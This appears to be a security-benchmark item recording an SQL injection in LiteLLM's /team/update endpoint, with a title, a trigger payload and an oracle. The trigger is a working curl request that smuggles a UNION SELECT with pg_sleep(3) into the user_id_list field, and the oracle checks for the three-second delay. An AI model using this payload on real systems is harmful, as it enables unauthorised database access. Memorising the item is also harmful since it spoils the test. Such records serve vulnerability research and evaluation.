title: SQL injection in LiteLLM due to unsafe use of user_id_list in raw SQL query
trigger_payload: curl http://localhost:8000/team/update -X POST -H "Authorization: Bearer sk-1234" -H "Content-Type: application/json" -d '{"user_id_list": [") UNION SELECT '1', '', '{}', '', NULL, 0, '', '{}', NULL, NULL, NULL, '', NULL, '{}', '{}', '{}' from pg_sleep(3)-- -"]}'
oracle: The request takes approximately 3 seconds to complete, indicating that the SQL injection payload was executed and caused a delay.
